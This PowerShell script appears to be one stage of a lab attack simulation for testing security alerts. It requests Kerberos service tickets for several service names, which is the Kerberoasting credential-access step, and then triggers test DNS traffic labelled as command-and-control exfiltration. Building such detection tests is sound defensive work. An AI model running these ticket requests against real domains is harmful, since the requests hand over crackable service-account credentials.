<#
    Stage 4 (MIDDLE) - Weak (RC4) Kerberos TGT
    ==========================================
    Requesting service tickets with legacy RC4 (etype 23) encryption yields
    weakly-encrypted, crackable tickets - a downgrade that also shows in a weak
    TGT response.

      EAL alert : 'Weakly-Encrypted Kerberos TGT Response'  (rule - ITDR)
      ATT&CK    : Credential Access (TA0006) /
                  Modify Authentication Process: DC Authentication (T1556.001)
#>
param([switch]$DryRun)
. "$PSScriptRoot\..\config\lab-config.ps1"
. "$PSScriptRoot\_net.ps1"
$cfg = $Global:EalDemo
if ($DryRun) { $cfg.DryRun = $true }

Write-Stage "STAGE 4 (Cred Access): RC4 Kerberos ticket requests to $($cfg.DomainController)" "INFO"
Add-Type -AssemblyName System.IdentityModel -ErrorAction SilentlyContinue
$spns = @("HOST/$($cfg.DomainController)", "CIFS/$($cfg.DomainController)", "LDAP/$($cfg.DomainController)",
          "MSSQLSvc/db01.$($cfg.Domain):1433", "HTTP/web01.$($cfg.Domain)")
foreach ($spn in $spns) {
    if ($cfg.DryRun) { Write-Host "  DRY: TGS (RC4) for $spn"; continue }
    try { $t = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
          Write-Stage "  requested ticket for $spn" "OK" }
    catch { Write-Stage "  ticket request for $spn generated Kerberos traffic: $($_.Exception.Message)" "WARN" }
    Start-Sleep -Milliseconds $cfg.DelayBetweenReqMs
}
Write-Stage "  Tip: 'klist' shows cached tickets; etype 23 (RC4) is the weak one." "INFO"
# Firewall anchor: the kerberoast tool exfils tickets to C2.
Invoke-TestDns -Category "c2"
Write-Stage "STAGE 4 done. Expect FW NGFW: DNS-Security C2 + (ITDR/baseline) EAL 'Weakly-Encrypted Kerberos TGT Response'." "OK"
